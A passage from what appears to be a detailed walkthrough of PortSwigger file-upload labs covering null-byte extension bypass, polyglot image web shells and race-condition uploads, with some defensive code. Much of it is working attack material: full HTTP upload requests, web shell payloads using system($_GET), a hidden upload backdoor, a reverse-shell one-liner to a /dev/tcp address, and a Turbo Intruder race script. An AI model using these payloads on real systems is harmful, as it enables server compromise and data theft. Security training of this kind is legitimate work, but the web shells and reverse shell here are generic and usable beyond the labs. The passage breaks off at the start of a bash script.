$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array(strtolower($ext), $allowed)) {
    die('Invalid file type');
}
```

#### Store Outside Web Root
```php
// Upload to non-web-accessible location
$upload_dir = '/var/data/uploads/';  // Not in /var/www/html/
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $safe_name);

// Serve files through proxy script that validates requests
```

#### Rename All Uploaded Files
```php
// Generate random filename, store mapping in database
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $new_name);
```

#### Defense in Depth
1. **Blacklist config files**: Block .htaccess, web.config, .user.ini
2. **Whitelist extensions**: Only allow safe image/document types
3. **Disable overrides**: Set `AllowOverride None` in Apache config
4. **Validate content**: Check magic bytes, not just extension
5. **Separate storage**: Store uploads outside document root
6. **Random filenames**: Don't use user-supplied filenames
7. **Strict permissions**: Upload directory should be write-only, not executable

---

## Lab 5: Web Shell Upload via Obfuscated File Extension

**Difficulty**: PRACTITIONER
**Lab URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

### Vulnerability Description
This lab implements an extension blacklist that blocks dangerous file types like `.php`. However, the validation is vulnerable to null byte injection. In many programming languages (especially C-based languages), the null byte (`\0` or `%00` in URL encoding) terminates string processing. By injecting a null byte into the filename (`exploit.php%00.jpg`), attackers can trick the validation (which sees `.jpg`) while the file system processes only the portion before the null byte (`exploit.php`).

### Learning Objectives
- Understand null byte injection vulnerabilities
- Learn string termination exploitation techniques
- Practice filename obfuscation methods
- Understand the difference between validation and file system processing

### Step-by-Step Solution

#### Step 1: Authentication & Initial Upload
1. Access the lab and log in with credentials `wiener:peter`
2. Navigate to "My Account" page
3. Upload a legitimate image file (JPEG or PNG) to test functionality
4. Confirm successful upload and note the file appears as your avatar

#### Step 2: Examine Upload Mechanism
1. Open Burp Suite **Proxy > HTTP history**
2. Locate the GET request retrieving your uploaded avatar:
   - Example: `GET /files/avatars/[your-image].jpg`
3. Right-click the request and select **Send to Repeater**
4. This will be used later to access your exploit

#### Step 3: Create Malicious Payload
Create a file named `exploit.php` with:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

#### Step 4: Test Extension Blacklist
1. Return to the avatar upload form in your browser
2. Attempt to upload `exploit.php`
3. Observe the error message:
```
Sorry, only JPG & PNG files are allowed
Sorry, there was an error uploading your file.
```

This confirms the application blacklists `.php` extensions.

#### Step 5: Intercept Upload Request
1. In Burp Suite, ensure **Proxy > Intercept** is enabled (optional - can also use Repeater)
2. Locate the `POST /my-account/avatar` request in **Proxy > HTTP history**
3. Right-click and **Send to Repeater** for manipulation

#### Step 6: Craft Null Byte Injection
In Burp Repeater, modify the filename in the Content-Disposition header:

**Original**:
```
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
```

**Modified with null byte injection**:
```
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
```

**Complete modified request**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: session=YOUR_SESSION

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

CSRF_TOKEN
------WebKitFormBoundary--
```

**Key modification**: `filename="exploit.php%00.jpg"`
- `%00` is URL-encoded null byte
- Validation sees `.jpg` extension (allowed)
- File system processes `exploit.php` (truncated at null byte)

#### Step 7: Send Modified Request
1. Click **Send** in Burp Repeater
2. Examine the response - it should indicate successful upload:
```
The file avatars/exploit.php has been uploaded.
```

Notice the response shows `exploit.php`, not `exploit.php%00.jpg` - the server truncated at the null byte.

#### Step 8: Execute Web Shell
1. Switch to the Repeater tab containing the GET request for avatar retrieval
2. Modify the path to request your uploaded exploit:
```http
GET /files/avatars/exploit.php HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=YOUR_SESSION
```

3. Click **Send**
4. The response body contains Carlos's secret file contents

#### Step 9: Submit Solution
1. Copy the secret value from the response
2. Click "Submit solution" in the lab banner
3. Paste the secret to complete the lab

### HTTP Requests and Responses

**Failed Upload (Without Null Byte)**:
```http
POST /my-account/avatar HTTP/1.1

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary--
```

**Response**:
```http
HTTP/1.1 403 Forbidden

Sorry, only JPG & PNG files are allowed
```

**Successful Upload (With Null Byte)**:
```http
POST /my-account/avatar HTTP/1.1

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary--
```

**Response**:
```http
HTTP/1.1 200 OK

The file avatars/exploit.php has been uploaded.
```

**Execution Request**:
```http
GET /files/avatars/exploit.php HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=YOUR_SESSION
```

**Execution Response**:
```http
HTTP/1.1 200 OK
Content-Type: text/html
X-Powered-By: PHP/7.4.3

[CARLOS_SECRET_VALUE]
```

### Key Techniques

#### Null Byte Injection Theory

**What is a Null Byte?**
- ASCII value: 0
- Hex representation: `\x00`
- URL encoding: `%00`
- String terminator in C/C++, PHP (older versions), and many other languages

**How It Works**:
```
Filename: "exploit.php\x00.jpg"

Validation layer (string functions):
- Sees full string: "exploit.php\x00.jpg"
- Extract extension: ".jpg" (from end of string)
- Check: ".jpg" is allowed ✓

File system layer (C-based functions):
- Process string: "exploit.php\x00.jpg"
- Stop at null byte: "exploit.php"
- Save file as: "exploit.php"
```

**Vulnerable Code Example (PHP)**:
```php
// VULNERABLE - older PHP versions or improper handling
$filename = $_FILES['file']['name'];  // "exploit.php%00.jpg"
$ext = substr($filename, strrpos($filename, '.'));  // ".jpg"

if ($ext == '.jpg' || $ext == '.png') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
    // Filename truncated at null byte by file system → "exploit.php"
}
```

#### Null Byte Encoding Variations

| Encoding | Representation | Use Case |
|----------|----------------|----------|
| **URL Encoded** | `%00` | HTTP requests (most common) |
| **Hexadecimal** | `\x00` | Binary protocols, raw bytes |
| **Decimal** | `\0` | Programming (C, PHP strings) |
| **Unicode** | `\u0000` | JSON, some web frameworks |
| **Double URL Encoded** | `%2500` | Bypass initial decoding |

#### Alternative Null Byte Payloads
```
exploit.php%00.jpg
exploit.php%00.png
exploit.php\x00.jpg
exploit.asp%00.png
exploit.jsp%00.gif
exploit.php%00%00.jpg (double null byte)
exploit.php%2500.jpg (double URL encoded)
```

### Burp Suite Features Utilized

1. **Proxy > HTTP History**: Capture and review upload requests
2. **Repeater**: Modify and test filename manipulations
3. **URL Encoding**: Burp automatically maintains %00 encoding
4. **Response Analysis**: Verify successful upload and truncation

### Common Pitfalls and Troubleshooting

| Problem | Solution |
|---------|----------|
| **Null byte doesn't work** | Server may be patched; try alternatives (double extension, case variation) |
| **Filename validation still fails** | Ensure using `%00` (URL-encoded), not literal null byte |
| **File saved with full name** | Modern PHP/frameworks may be patched; null byte injection less effective |
| **Can't find uploaded file** | Check upload response for actual saved filename |
| **Request syntax error in Burp** | Ensure proper URL encoding; don't paste literal null character |
| **Upload succeeds but file won't execute** | Verify PHP execution enabled in upload directory |

### Why This Bypass Works

**String Processing Discrepancy**:
```
HIGH-LEVEL CODE (PHP/Python/Java):
- Processes strings as complete objects
- ".jpg" is at the end of string
- Validation passes

LOW-LEVEL CODE (C libraries, filesystem):
- Strings are null-terminated arrays
- Stops processing at \x00
- Saves only "exploit.php"
```

**Validation vs. Execution**:
```
VALIDATION PHASE:
filename = "exploit.php%00.jpg"
extension = extract_extension(filename)  # Returns ".jpg"
if extension in [".jpg", ".png"]:  # Passes ✓
    proceed_with_upload()

FILE SYSTEM PHASE:
save_file("uploads/exploit.php%00.jpg")
# C library truncates at null byte
# Actual file: uploads/exploit.php
```

### Real-World Examples

#### CVE-2008-2119: PHP File Upload Null Byte
Older PHP versions (< 5.3.4) were vulnerable to null byte injection in file operations.

#### CVE-2012-1823: PHP CGI Argument Injection
Null bytes used to inject arguments in PHP CGI mode.

#### CVE-2013-4625: Ruby on Rails Path Traversal
Null byte bypass in Rails file upload validation.

### Attack Variations

#### Variation 1: Double Null Byte
```
exploit.php%00%00.jpg
```
Some filters strip single null bytes but miss doubles.

#### Variation 2: Null Byte + Path Traversal
```
../exploit.php%00.jpg
```
Combine techniques for multi-layer bypass.

#### Variation 3: Double URL Encoding
```
exploit.php%2500.jpg
```
If server decodes twice, %25 → %, then %00 → null byte.

#### Variation 4: Null Byte in Different Position
```
exploit%00.php.jpg  # May confuse some validators
```

### Defense Against Null Byte Injection

#### Proper Input Sanitization
```php
// Remove null bytes before any processing
$filename = str_replace("\0", '', $_FILES['file']['name']);
$filename = str_replace('%00', '', $filename);

// Or use basename() which strips null bytes in modern PHP
$filename = basename($_FILES['file']['name']);
```

#### Extension Validation After Sanitization
```php
// Sanitize first
$filename = basename($_FILES['file']['name']);
$filename = preg_replace('/[^a-zA-Z0-9._-]/', '', $filename);

// Then validate extension
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
if (!in_array($ext, $allowed)) {
    die('Invalid file type');
}
```

#### Use Whitelist with Strict Matching
```php
// Extract extension properly
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

// Strict whitelist
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
if (!in_array($ext, $allowed, true)) {  // Strict comparison
    die('File type not allowed');
}
```

#### Generate Random Filenames
```php
// Don't use user-supplied filename at all
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$safe_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $safe_name);
```

#### Modern PHP Protection
PHP 5.3.4+ automatically removes null bytes from file paths in most functions:
```php
// Modern PHP strips null bytes automatically
move_uploaded_file($tmp, "uploads/exploit.php\x00.jpg");
// Effectively becomes: "uploads/exploit.php.jpg"
```

However, don't rely solely on this - implement proper validation.

### Testing for Null Byte Vulnerabilities

#### Manual Testing Checklist
1. Upload file with normal extension (.jpg) - should succeed
2. Upload file with dangerous extension (.php) - should fail
3. Upload file with null byte injection (.php%00.jpg) - if succeeds, vulnerable
4. Check saved filename on server - if truncated at null byte, confirmed vulnerable
5. Test execution - if PHP executes, critical vulnerability

#### Automated Testing
```bash
# Using curl
curl -X POST http://target.com/upload \
  -F "file=@exploit.php;filename=exploit.php%00.jpg"

# Check if file saved as exploit.php
curl http://target.com/uploads/exploit.php
```

```python
# Python test script
import requests

files = {
    'file': ('exploit.php\x00.jpg', '<?php phpinfo(); ?>', 'image/jpeg')
}
r = requests.post('http://target.com/upload', files=files)

# Try accessing without null byte
r = requests.get('http://target.com/uploads/exploit.php')
if 'phpinfo()' in r.text or 'PHP Version' in r.text:
    print("[+] Vulnerable to null byte injection!")
```

### Historical Context

Null byte injection was extremely common in the 2000s and early 2010s. It affected:
- Early PHP versions (pre-5.3.4)
- Many C-based web servers and applications
- File upload handlers in various frameworks
- Path traversal and file inclusion vulnerabilities

Modern languages and frameworks have largely patched this, but legacy applications and custom code may still be vulnerable.

---

## Lab 6: Remote Code Execution via Polyglot Web Shell Upload

**Difficulty**: PRACTITIONER
**Lab URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

### Vulnerability Description
This lab implements robust server-side validation that checks the actual content of uploaded files, not just headers or extensions. The server verifies that uploaded files are legitimate images by examining their structure and magic bytes. However, the application still executes PHP code if found within the file. By creating a "polyglot" file—a file that is simultaneously a valid image AND executable PHP code—attackers can bypass content validation while achieving code execution.

### Learning Objectives
- Understand polyglot file creation techniques
- Learn to use ExifTool for metadata injection
- Practice bypassing content-based validation
- Understand the relationship between file structure and code execution

### Step-by-Step Solution

#### Step 1: Create PHP Payload
First, develop the PHP code to extract the target file:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Enhanced payload with markers for easier extraction**:
```php
<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
```

The START/END markers make it easier to locate the output within binary image data.

#### Step 2: Test Direct Upload
1. Log in with credentials `wiener:peter`
2. Create a file named `exploit.php` with the payload above
3. Try uploading it as your avatar
4. **Result**: Upload rejected

The server performs content validation, detecting that the file is not a legitimate image.

#### Step 3: Create Polyglot File with ExifTool

**Install ExifTool** (if not already available):
```bash
# Linux/Mac
sudo apt install libimage-exiftool-perl  # Debian/Ubuntu
brew install exiftool  # Mac with Homebrew

# Or download from: https://exiftool.org/
```

**Obtain a legitimate base image**:
```bash
# Download any JPEG image or use existing one
curl -O https://via.placeholder.com/150 -o base.jpg
# Or use any existing JPEG from your system
```

**Create polyglot using ExifTool**:
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" base.jpg -o polyglot.php
```

**Command breakdown**:
- `exiftool`: The EXIF metadata manipulation tool
- `-Comment="..."`: Sets the Comment field in EXIF data to our PHP payload
- `base.jpg`: Input image (legitimate JPEG file)
- `-o polyglot.php`: Output filename with .php extension

**What this creates**:
- A file with valid JPEG structure (passes image validation)
- EXIF Comment field contains PHP code
- File extension is .php (will be executed by server)

#### Step 4: Upload Polyglot File
1. Return to the avatar upload form
2. Select the generated `polyglot.php` file
3. Upload it
4. **Result**: Upload succeeds!

The server's content validation sees:
- Valid JPEG magic bytes (FF D8 FF E0/E1/E2)
- Valid JPEG structure with EXIF data
- Passes as legitimate image ✓

#### Step 5: Extract Secret from Response
1. After upload, navigate to your account page (or refresh)
2. Open Burp Suite **Proxy > HTTP history**
3. Locate the GET request to retrieve your avatar:
   - Example: `GET /files/avatars/polyglot.php`
4. Right-click and **Send to Repeater**
5. In Repeater, send the request again
6. In the **Response** panel, the output is binary image data mixed with text

**Finding the secret**:
1. Click on the **Response** tab in Repeater
2. Use the search function (Ctrl+F / Cmd+F)
3. Search for: `START`
4. The secret appears between START and END markers within the binary data

**Example output in response**:
```
...[binary JPEG data]...START abc123secretvalue456 END...[more binary data]...
```

#### Step 6: Submit Solution
1. Copy the secret value (the text between START and END)
2. Click "Submit solution" in the lab banner
3. Paste the secret to complete the lab

### Alternative Method: Direct PHP Execution

If the server executes the polyglot as PHP (returning HTML instead of image):
```http
GET /files/avatars/polyglot.php HTTP/1.1
```

**Response may be**:
```
START abc123secretvalue456 END
```

The secret is directly visible in the response (not embedded in binary data).

### Polyglot Creation Techniques

#### Method 1: ExifTool Comment Field
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

**Access**: `shell.php?cmd=whoami`

#### Method 2: ExifTool Multiple Fields
```bash
# Different EXIF fields
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
exiftool -Artist='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
exiftool -Copyright='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
exiftool -ImageDescription='<?php phpinfo(); ?>' image.jpg -o shell.php
```

#### Method 3: Manual JPEG + PHP Concatenation
```bash
# Simple concatenation (works if server doesn't validate end of file)
cat image.jpg > polyglot.php
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php
```

This creates a file that:
- Starts with valid JPEG structure
- Ends with PHP code
- Image viewers display the image portion
- PHP interpreter executes the code portion

#### Method 4: GIF Polyglot
```bash
# GIF header + PHP
echo 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

GIF files have a very simple header (`GIF89a` or `GIF87a`), making them easy to fake.

#### Method 5: PNG Polyglot (Advanced)
PNG files have a chunk-based structure. Inject PHP into a text chunk:

```python
import struct

# Read original PNG
with open('image.png', 'rb') as f:
    data = f.read()

# Create tEXt chunk with PHP payload
payload = b'<?php system($_GET["cmd"]); ?>'
chunk_data = b'comment\x00' + payload
chunk_type = b'tEXt'

# Calculate CRC (PNG requires CRC for each chunk)
import zlib
crc = zlib.crc32(chunk_type + chunk_data) & 0xffffffff

# Build chunk: length + type + data + CRC
chunk = struct.pack('>I', len(chunk_data)) + chunk_type + chunk_data + struct.pack('>I', crc)

# Insert after PNG signature
png_signature = data[:8]
rest_of_png = data[8:]

# Write polyglot
with open('polyglot.php', 'wb') as f:
    f.write(png_signature + chunk + rest_of_png)
```

### HTTP Requests and Responses

**Upload Polyglot Request**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: session=YOUR_SESSION

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="polyglot.php"
Content-Type: image/jpeg

ÿØÿà...[binary JPEG data with embedded PHP in EXIF]...
------WebKitFormBoundary--
```

**Upload Response**:
```http
HTTP/1.1 200 OK

The file avatars/polyglot.php has been uploaded.
```

**Execution Request**:
```http
GET /files/avatars/polyglot.php HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Execution Response** (mixed binary + text):
```http
HTTP/1.1 200 OK
Content-Type: text/html

ÿØÿà...[binary JPEG data]...START abc123secret456 END...[more binary]...
```

### Key Techniques

#### EXIF Metadata Injection
- **EXIF**: Exchangeable Image File Format - metadata stored in images
- **Common fields**: Comment, Artist, Copyright, DocumentName, ImageDescription
- **PHP processing**: When PHP file is executed, it processes entire file including EXIF
- **Execution flow**: PHP parser encounters `<?php` tag in EXIF data and executes it

#### File Format Structure Preservation
- **JPEG magic bytes preserved**: File still starts with FF D8 FF E0
- **JPEG structure intact**: All required JPEG markers present
- **EXIF segment added**: Contains PHP payload in metadata
- **File validators see**: Valid image format
- **PHP interpreter sees**: Executable PHP code

### Burp Suite Features Utilized

1. **Proxy > HTTP History**: Monitor upload and retrieval
2. **Repeater**: Test file execution repeatedly
3. **Search Function**: Find START/END markers in binary response
4. **Response Viewer**: Switch between Raw/Hex views to locate text in binary

### Common Pitfalls and Troubleshooting

| Problem | Solution |
|---------|----------|
| **ExifTool not found** | Install: `apt install libimage-exiftool-perl` or download from exiftool.org |
| **Polyglot upload rejected** | Ensure base image is valid; try different EXIF field (Artist, Copyright) |
| **Can't find secret in response** | Search for START marker; use Hex view; check Response tab in Burp |
| **Secret not appearing** | PHP might not be executing; verify .php extension on upload |
| **Binary data overwhelming** | Use Burp's search feature (Ctrl+F) to find text within binary |
| **Wrong secret value** | Ensure copying only the content between START and END, no binary garbage |

### Why This Attack Works

**Content Validation Logic**:
```
SERVER VALIDATION:
1. Read file header: FF D8 FF E0 (valid JPEG) ✓
2. Parse JPEG structure: Valid segments found ✓
3. Check EXIF data: Present and well-formed ✓
4. Conclusion: File is a legitimate image, allow upload

PHP EXECUTION:
1. File has .php extension → Process as PHP
2. PHP parser scans entire file for <?php tags
3. Finds tag in EXIF Comment field
4. Executes code within tag
5. Returns output mixed with image binary data
```

**Dual Nature of Polyglot**:
- **As Image**: Valid structure, can be opened in image viewers
- **As PHP**: Contains executable code, runs when accessed via web server

### Real-World Impact

Polyglot attacks are particularly dangerous because:
1. **Bypass content-based validation**: Even strict image verification fails
2. **Evade malware scanners**: File appears as legitimate image
3. **Persistent threat**: Image stored and served repeatedly
4. **XSS vectors**: SVG polyglots can execute JavaScript
5. **Data exfiltration**: Hidden channels in image metadata

### Real-World Examples

#### ImageTragick (CVE-2016-3714)
ImageMagick vulnerability where specially crafted images could execute commands.

#### GIFAR Files
GIF + JAR polyglots exploited Java applet security in browsers.

#### PDF Polyglots
PDF files with embedded JavaScript executing in PDF readers.

### Alternative Polyglot Payloads

#### Web Shell with Command Parameter
```bash
exiftool -Comment='<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' image.jpg -o shell.php
```
**Usage**: `shell.php?c=whoami`

#### File Upload Backdoor
```bash
exiftool -Comment='<?php if($_FILES){move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]);} ?>' image.jpg -o uploader.php
```
**Usage**: Upload additional files through this backdoor

#### Reverse Shell
```bash
exiftool -Comment='<?php system("bash -c \"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\""); ?>' image.jpg -o reverse.php
```
**Usage**: Access reverse.php to trigger shell connection

### Defense Against Polyglot Attacks

#### Strict Content Validation + Sanitization
```php
// Not enough: just checking magic bytes
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);

// Better: Sanitize and re-encode images
if ($mime == 'image/jpeg') {
    // Re-encode image, stripping metadata
    $img = imagecreatefromjpeg($_FILES['file']['tmp_name']);
    imagejpeg($img, 'uploads/' . $safe_name, 90);
    imagedestroy($img);
}
```

#### Strip EXIF Metadata
```php
// Use GD library to re-create image without metadata
$source = imagecreatefromjpeg($_FILES['file']['tmp_name']);
imagejpeg($source, 'uploads/' . $safe_name);
imagedestroy($source);
```

#### Store Outside Web Root
```php
// Upload to non-executable location
$upload_dir = '/var/data/uploads/';  // Not in /var/www/
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $safe_name);

// Serve via proxy script
// download.php?file=abc123.jpg
```

#### Disable PHP Execution in Upload Directory
**Apache (.htaccess)**:
```apache
<FilesMatch "\.(php|phtml|php3)$">
    Deny from all
</FilesMatch>
```

**Nginx**:
```nginx
location /uploads/ {
    location ~ \.php$ {
        return 403;
    }
}
```

#### Content Security Policy
```php
header("Content-Security-Policy: default-src 'none'; img-src 'self';");
header("X-Content-Type-Options: nosniff");
```

#### Defense in Depth Strategy
1. **Validate content**: Check magic bytes and structure
2. **Strip metadata**: Remove EXIF data using image libraries
3. **Re-encode images**: Create new image from validated source
4. **Random filenames**: Never use user-supplied names
5. **Store outside web root**: Upload directory not web-accessible
6. **Disable execution**: Web server config prevents script execution
7. **Serve with proper headers**: Force correct Content-Type, no sniffing
8. **Regular scanning**: Antimalware tools on uploaded files

---

## Lab 7: Web Shell Upload via Race Condition

**Difficulty**: PRACTITIONER
**Lab URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

### Vulnerability Description
This lab demonstrates a race condition vulnerability in file upload validation logic. The application follows a "upload first, validate later" pattern:
1. User uploads file → immediately saved to web-accessible directory
2. File is scanned for malware/threats (takes time)
3. If malicious, file is deleted

During the brief window between upload and deletion (typically milliseconds to a few seconds), the malicious file exists on the server and can be accessed and executed. By sending rapid, concurrent requests during this window, attackers can execute code before the file is removed.

### Learning Objectives
- Understand time-of-check-to-time-of-use (TOCTOU) vulnerabilities
- Learn race condition exploitation techniques
- Master Burp Turbo Intruder for timing attacks
- Practice concurrent request techniques

### Step-by-Step Solution

#### Phase 1: Reconnaissance
1. Log in with credentials `wiener:peter`
2. Navigate to "My Account" page
3. Upload a legitimate image file as avatar
4. Open Burp Suite **Proxy > HTTP history**
5. Locate the GET request retrieving your avatar:
   - Example: `GET /files/avatars/[image].jpg`
6. Note the file storage path: `/files/avatars/`

#### Phase 2: Create Exploit Payload
Create `exploit.php`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

#### Phase 3: Test Upload Validation
1. Attempt to upload `exploit.php` directly
2. **Result**: Upload succeeds initially but file is quickly removed
3. Try accessing `/files/avatars/exploit.php` immediately
4. **Result**: 404 Not Found (file already deleted by security scan)

This confirms:
- PHP files are initially accepted and stored
- Validation/scanning occurs asynchronously
- Files are accessible briefly before deletion

#### Phase 4: Install Burp Turbo Intruder
1. Open Burp Suite
2. Navigate to **Extender** tab
3. Click **BApp Store** sub-tab
4. Search for "Turbo Intruder"
5. Click **Install**
6. Wait for installation to complete

**Turbo Intruder**: Specialized extension for sending high-volume, precisely-timed HTTP requests (essential for race condition attacks).

#### Phase 5: Capture Upload and Access Requests

**Capture Upload Request**:
1. In Burp **Proxy > HTTP history**, find the `POST /my-account/avatar` request
2. Ensure it contains your `exploit.php` upload
3. Right-click the request → **Extensions** → **Turbo Intruder** → **Send to turbo intruder**

**Capture Access Request**:
1. In Burp history, find a `GET /files/avatars/[any-file]` request
2. Send it to Repeater
3. Modify the path to: `GET /files/avatars/exploit.php`
4. Copy this entire request

#### Phase 6: Configure Turbo Intruder Script

In the Turbo Intruder window, you'll see a Python script template. Replace it with:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,)

    # POST request to upload exploit.php
    request1 = '''POST /my-account/avatar HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: XXXX

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
------WebKitFormBoundary--
'''

    # GET request to access exploit.php
    request2 = '''GET /files/avatars/exploit.php HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE

'''

    # Queue requests with gate synchronization
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # Open gate - all requests sent simultaneously
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

**Critical modifications**:
1. Replace `YOUR-LAB-ID` with your actual lab ID from the URL
2. Replace `YOUR-SESSION-COOKIE` with your session value from Burp
3. Replace `YOUR-CSRF-TOKEN` with the CSRF token from your upload request
4. Update `Content-Length` if needed (or remove - Burp calculates automatically)
5. Ensure request formatting is preserved (line breaks, boundaries)

**Script explanation**:
- `request1`: POST request that uploads `exploit.php`
- `request2`: GET request that accesses `exploit.php`
- `gate='race1'`: Queues all requests but doesn't send them yet
- `engine.openGate('race1')`: Sends ALL queued requests simultaneously
- 1 POST + 5 GET requests sent at same time
- Some GET requests will execute before file is deleted

#### Phase 7: Execute Attack
1. Review your Turbo Intruder script for accuracy
2. Click the **Attack** button
3. Turbo Intruder sends the requests concurrently
4. Monitor the results table

#### Phase 8: Analyze Results
In the Turbo Intruder results table, look for:
- Most GET requests: `404 Not Found` (file already deleted)
- **Success**: One or more GET requests with `200 OK` and response length > 0

**Successful response contains**:
```
HTTP/1.1 200 OK
Content-Type: text/html

[CARLOS_SECRET_VALUE]
```

**Why it works**: The GET request(s) with 200 status arrived during the brief window after upload but before deletion.

#### Phase 9: Extract Secret
1. Click on a successful 200 OK response in the results table
2. View the **Response** tab
3. Copy Carlos's secret value

#### Phase 10: Submit Solution
1. Click "Submit solution" in the lab banner
2. Paste the secret to complete the lab

### HTTP Requests and Responses

**Upload Request (via Turbo Intruder)**:
```http
POST /my-account/avatar HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=abc123...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary--
```

**Access Request (via Turbo Intruder, sent 5x concurrently)**:
```http
GET /files/avatars/exploit.php HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=abc123...
```

**Failed Response (file deleted)**:
```http
HTTP/1.1 404 Not Found
Content-Type: text/html

404 - File not found
```

**Successful Response (during race window)**:
```http
HTTP/1.1 200 OK
Content-Type: text/html
X-Powered-By: PHP/7.4.3

[CARLOS_SECRET_VALUE]
```

### Race Condition Timing Diagram

```
Time →
─────────────────────────────────────────────────
Upload:    [POST upload.php]
                ↓
Storage:         [File written to /files/avatars/]
                      ↓
Access:               [GET exploit.php] ← RACE WINDOW (exploitable)
                           ↓
Scan:                      [Virus scan starts]
                                ↓
Delete:                         [File deleted]
                                     ↓
Access:                               [GET exploit.php] ← 404 (too late)
```

**Exploit window**: Between storage and deletion (typically 100ms - 2 seconds)

### Key Techniques

#### Gate-Based Synchronization
```python
# Queue requests without sending
engine.queue(request1, gate='race1')
engine.queue(request2, gate='race1')

# Release all at once
engine.openGate('race1')
```

**Purpose**: Ensures requests are sent simultaneously, maximizing chance of hitting the race window.

#### Concurrent Connections
```python
concurrentConnections=10
```

Sends multiple requests in parallel to increase probability of success.

#### Request Repetition
```python
for x in range(5):
    engine.queue(request2, gate='race1')
```

Sends 5 GET requests concurrently - increases odds that at least one hits the window.

### Burp Turbo Intruder Features

| Feature | Purpose |
|---------|---------|
| **RequestEngine** | High-performance HTTP request engine |
| **concurrentConnections** | Number of parallel connections |
| **gate mechanism** | Synchronize request timing |
| **queue()** | Add request to queue |
| **openGate()** | Release all queued requests simultaneously |
| **Results table** | View all responses with filtering |

### Common Pitfalls and Troubleshooting

| Problem | Solution |
|---------|----------|
| **All requests return 404** | Increase repetitions (range(5) → range(20)); decrease delay |
| **Turbo Intruder not installed** | Install from BApp Store; restart Burp if needed |
| **Syntax error in script** | Check indentation (Python is whitespace-sensitive) |
| **Requests not sent** | Verify Host header and session cookie are correct |
| **Session expired** | Re-login, capture fresh session cookie and CSRF token |
| **No 200 responses** | Try increasing concurrentConnections to 50 |
| **Wrong secret value** | Ensure copying from 200 OK response, not 404 |

### Alternative Exploitation Methods

#### Method 1: Bash Script
```bash
#!/bin/bash

TARGET="http://target.com"
